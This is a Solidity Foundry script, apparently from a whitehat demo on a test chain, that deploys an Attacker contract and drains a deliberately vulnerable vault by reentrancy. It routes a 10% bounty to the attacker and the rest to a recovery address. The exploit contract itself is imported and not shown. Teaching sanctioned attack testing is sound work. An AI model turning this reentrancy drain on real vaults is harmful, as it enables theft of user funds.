// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Script, console} from "forge-std/Script.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IAttackRegistry} from "../src/interfaces/IBattleChain.sol";
import {Attacker} from "../src/Attacker.sol";

/// @notice Step 4 (Whitehat): Deploy the Attacker contract and drain VulnerableVault.
///
/// Prerequisites — set in .env:
///   MOCK_TOKEN, VAULT_ADDRESS, AGREEMENT_ADDRESS
///   RECOVERY_ADDRESS (the protocol's asset recovery address from the agreement)
///
/// The vault must be in UNDER_ATTACK state (DAO approved) before running.
///
/// Usage:
///   forge script script/Attack.s.sol --rpc-url battlechain --broadcast
contract Attack is Script {
    address constant ATTACK_REGISTRY = 0x9E62988ccA776ff6613Fa68D34c9AB5431Ce57e1;

    uint256 constant SEED_AMOUNT = 100e18; // tokens deposited to trigger reentrancy
    uint256 constant BOUNTY_BPS  = 1_000;  // 10% bounty (matches agreement terms)

    function run() external {
        uint256 attackerKey      = vm.envUint("PRIVATE_KEY");
        address attackerAddr     = vm.addr(attackerKey);
        address mockToken        = vm.envAddress("MOCK_TOKEN");
        address vault            = vm.envAddress("VAULT_ADDRESS");
        address recoveryAddress  = vm.envAddress("RECOVERY_ADDRESS");

        // Confirm the vault is in UNDER_ATTACK state before proceeding
        IAttackRegistry registry = IAttackRegistry(ATTACK_REGISTRY);
        require(
            registry.isTopLevelContractUnderAttack(vault),
            "Attack: vault is not in UNDER_ATTACK state - await DAO approval"
        );

        vm.startBroadcast(attackerKey);

        // Deploy the Attacker contract
        Attacker attacker = new Attacker(
            vault,
            mockToken,
            recoveryAddress,
            BOUNTY_BPS
        );
        console.log("Attacker deployed:", address(attacker));

        uint256 vaultBefore = IERC20(mockToken).balanceOf(vault);
        console.log("Vault balance before attack:", vaultBefore / 1e18, "BCDT");

        // Execute the reentrancy attack
        attacker.attack(SEED_AMOUNT);

        uint256 vaultAfter    = IERC20(mockToken).balanceOf(vault);
        uint256 attackerBal   = IERC20(mockToken).balanceOf(attackerAddr);
        uint256 recoveryBal   = IERC20(mockToken).balanceOf(recoveryAddress);

        vm.stopBroadcast();

        console.log("\n--- Attack complete ---");
        console.log("Vault balance after:    ", vaultAfter / 1e18, "BCDT");
        console.log("Attacker bounty:        ", attackerBal / 1e18, "BCDT");
        console.log("Returned to protocol:   ", recoveryBal / 1e18, "BCDT");
    }
}
